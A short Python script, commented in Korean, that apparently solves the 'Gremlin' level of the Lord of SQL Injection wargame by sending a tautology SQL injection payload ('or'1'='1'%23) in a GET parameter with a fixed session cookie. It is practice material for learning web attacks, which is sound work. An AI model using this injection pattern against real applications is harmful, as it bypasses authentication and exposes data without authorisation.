# -*- coding : UTF-8 -*-
from requests import get

'''
이 문제에 대해서는 딱히 풀이를 제공할 마음이 없습니다.
구글링. 이 문제는 단순히 구글에 "SQL Injection"이라고만 검색하셔도 
충분히 풀 수 있는 문제입니다. 
'''

#Lord of SQL Injection GREMLIN문제로 URL을 설정합니다.
url = "http://los.eagle-jump.org/gremlin_bbc5af7bed14aa50b84986f2de742f31.php"

#쿠키를 설정합니다. 당신의 쿠키로 설정해야 합니다.
cookie = dict(PHPSESSID="5u71g5vp7547tv8ffl7osl0fl5")

#파라미터를 저장합니다. PHP에서 $_SERVER['QUERY_STRING']에 해당되는 부분입니다.
param = "?id='or'1'='1'%23"

#requests 모듈을 이용해 HTTP GET으로 연결합니다.
r = get(url + param , cookies=cookie)

if r.text.find("<h2>GREMLIN Clear!</h2>") > 0:
    print("축하합니다! Gremlin 단계를 클리어했습니다!")
